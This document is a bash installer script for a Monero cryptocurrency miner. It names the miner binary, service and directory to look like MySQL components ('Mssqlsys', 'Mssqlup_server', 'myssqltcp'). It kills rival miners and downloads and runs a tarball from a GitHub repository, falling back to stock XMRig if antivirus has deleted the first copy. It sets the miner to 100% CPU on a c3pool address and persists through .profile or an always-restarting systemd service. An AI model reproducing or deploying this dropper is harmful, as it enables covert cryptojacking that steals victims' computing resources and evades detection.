#!/bin/bash

VERSION=2.11

# printing greetings

echo "Mssqlup mining setup script v$VERSION."
echo "(please report issues to admin@admin.com email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
  echo "警告: 不建议在root用户下使用此脚本"
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_wkgg_server.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 19999 ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "19999" -o "$PORT" -gt "19999" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions

echo "I will download, setup and run in background Monero CPU server."
echo "将进行下载设置,并在后台中运行phpup服务."
echo "If needed, server in foreground can be started by $HOME/myssqltcp/Mssqlup.sh script."
echo "如果需要,可以通过以下方法启动前台服务输出 $HOME/myssqltcp/Mssqlup.sh script."
echo "Mining will happen to $WALLET wallet."
echo "将使用 $WALLET 地址进行开采"
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://wkgg.com site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
  echo "由于脚本无法执行无密码的sudo，因此在您重启后首次登录此主机时，后台开采将从您的 $HOME/.profile 文件开始."
else
  echo "Mining in background will be performed using Mssqlup_server systemd service."
  echo "后台开采将使用Mssqlup_serber systemd服务执行."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
echo

echo
echo

# start doing stuff: preparing server

echo "[*] Removing previous Mysqlup Server (if any)"
echo "[*] 卸载以前的 Myssqlup  (如果存在)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop Mssqlup_server.service
fi
killall -9 xmrig
killall -9 phpup

echo "[*] Removing $HOME/myssqltcp directory"
rm -rf $HOME/myssqltcp

echo "[*] Downloading myssqltcp advanced version of phpup to /tmp/wkggxmr.tar.gz"
echo "[*] 下载 Wkgg 版本的 myssqltcp 到 /tmp/wkggxmr.tar.gz 中"
if ! curl -L --progress-bar "https://github.com/teshushu/BiBi/raw/main/wkggxmr.tar.gz" -o /tmp/wkggxmr.tar.gz; then
  echo "ERROR: Can't download https://github.com/teshushu/BiBi/raw/main/wkggxmr.tar.gz file to /tmp/wkggxmr.tar.gz"
  echo "发生错误: 无法下载 https://github.com/teshushu/BiBi/raw/main/wkggxmr.tar.gz 文件到 /tmp/wkggxmr.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/wkggxmr.tar.gz to $HOME/myssqltcp"
echo "[*] 解压 /tmp/wkggxmr.tar.gz 到 $HOME/myssqltcp"
[ -d $HOME/myssqltcp ] || mkdir $HOME/myssqltcp
if ! tar xf /tmp/wkggxmr.tar.gz -C $HOME/myssqltcp; then
  echo "ERROR: Can't unpack /tmp/wkggxmr.tar.gz to $HOME/myssqltcp directory"
  echo "发生错误: 无法解压 /tmp/wkggxmr.tar.gz 到 $HOME/myssqltcp 目录"
  exit 1
fi
rm /tmp/wkggxmr.tar.gz

echo "[*] Checking if advanced version of $HOME/myssqltcp/Mssqlsys works fine (and not removed by antivirus software)"
echo "[*] 检查目录 $HOME/myssqltcp/Mssqlsys 中的Mssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/myssqltcp/config.json
$HOME/myssqltcp/Mssqlsys --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/myssqltcp/Mssqlsys ]; then
    echo "WARNING: Advanced version of $HOME/myssqltcp/Mssqlsys is not functional"
	echo "警告: 版本 $HOME/myssqltcp/Mssqlsys 无法正常工作"
  else 
    echo "WARNING: Advanced version of $HOME/myssqltcp/Mssqlsys was removed by antivirus (or some other problem)"
	echo "警告: 该目录 $HOME/myssqltcp/Mssqlsys 下的Mssqlsys已被杀毒软件删除 (或其它问题)"
  fi

  echo "[*] Looking for the latest version of Monero server"
  echo "[*] 查看最新版本的 Mssqlsys 服务工具"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  echo "[*] 下载 $LATEST_XMRIG_LINUX_RELEASE 到 /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
	echo "发生错误: 无法下载 $LATEST_XMRIG_LINUX_RELEASE 文件到 /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/myssqltcp"
  echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/myssqltcp"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/myssqltcp --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/myssqltcp directory"
	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/myssqltcp 目录下"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/myssqltcp/Mssqlsys works fine (and not removed by antivirus software)"
  echo "[*] 检查目录 $HOME/myssqltcp/Mssqlsys 中的Mssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/myssqltcp/config.json
  $HOME/myssqltcp/Mssqlsys --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/myssqltcp/Mssqlsys ]; then
      echo "ERROR: Stock version of $HOME/myssqltcp/Mssqlsys is not functional too"
	  echo "发生错误: 该目录中的 $HOME/myssqltcp/Mssqlsys 也无法使用"
    else 
      echo "ERROR: Stock version of $HOME/myssqltcp/Mssqlsys was removed by antivirus too"
	  echo "发生错误: 该目录中的 $HOME/myssqltcp/Mssqlsys 已被杀毒软件删除"
    fi
    exit 1
  fi
fi

echo "[*] Server $HOME/myssqltcp/Mssqlsys is OK"
echo "[*] 服务 $HOME/myssqltcp/Mssqlsys 运行正常"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/myssqltcp/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/myssqltcp/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqltcp/Mssqlsys.log'",#' $HOME/myssqltcp/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json

cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/myssqltcp/config_background.json

# preparing script

echo "[*] Creating $HOME/myssqltcp/Mssqlup.sh script"
echo "[*] 在该目录下创建 $HOME/myssqltcp/Mssqlup.sh 脚本"
cat >$HOME/myssqltcp/Mssqlup.sh <<EOL
#!/bin/bash
if ! pidof Mssqlsys >/dev/null; then
  nice $HOME/myssqltcp/Mssqlsys \$*
else
  echo "Monero server is already running in the background. Refusing to run another one."
  echo "Run \"killall Mssqlsys\" or \"sudo killall Mssqlsys\" if you want to remove background server first."
  echo "Mssqlup服务已经在后台运行。 拒绝运行另一个."
  echo "如果要先删除后台服务，请运行 \"killall Mssqlsys\" 或 \"sudo killall Mssqlsys\"."
fi
EOL

chmod +x $HOME/myssqltcp/Mssqlup.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep myssqltcp/Mssqlup.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/myssqltcp/Mssqlup.sh script to $HOME/.profile"
	echo "[*] 添加 $HOME/myssqltcp/Mssqlup.sh 到 $HOME/.profile"
    echo "$HOME/myssqltcp/Mssqlup.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/myssqltcp/Mssqlup.sh script is already in the $HOME/.profile"
	echo "脚本 $HOME/myssqltcp/Mssqlup.sh 已存在于 $HOME/.profile 中."
  fi
  echo "[*] Running server in the background (see logs in $HOME/myssqltcp/Mssqlsys.log file)"
  echo "[*] 已在后台运行Mssqlsys (请查看 $HOME/myssqltcp/Mssqlsys.log 日志文件)"
  /bin/bash $HOME/myssqltcp/Mssqlup.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
	echo "[*] 启用 huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running server in the background (see logs in $HOME/myssqltcp/Mssqlsys.log file)"
	echo "[*] 已在后台运行Mssqlsys (请查看 $HOME/myssqltcp/Mssqlsys.log 日志文件)"
    /bin/bash $HOME/myssqltcp/Mssqlup.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup server activation after reboot yourself if possible."

  else

    echo "[*] Creating Mssqlup_server systemd service"
    cat >/tmp/Mssqlup_server.service <<EOL
[Unit]
Description=Monero server service

[Service]
ExecStart=$HOME/myssqltcp/Mssqlsys --config=$HOME/myssqltcp/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/Mssqlup_server.service /etc/systemd/system/Mssqlup_server.service
    echo "[*] Starting Mssqlup_server systemd service"
	echo "[*] 启动Mssqlup_server systemd服务"
    sudo killall Mssqlsys 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable Mssqlup_server.service
    sudo systemctl start Mssqlup_server.service
    echo "To see server service logs run \"sudo journalctl -u Mssqlup_server -f\" command"
	echo "查看服务日志,请运行 \"sudo journalctl -u Mssqlup_server -f\" 命令"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the server or you will be banned"
echo "提示: 如果您使用共享VPS，建议避免由服务产生100％的CPU使用率，否则可能将被禁止使用"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit server to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e Mssqlsys -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e Mssqlsys -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e Mssqlsys -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit server to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/myssqltcp/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/myssqltcp/config_background.json"
fi
echo ""

echo "[*] Setup complete"
echo "[*] 安装完成"
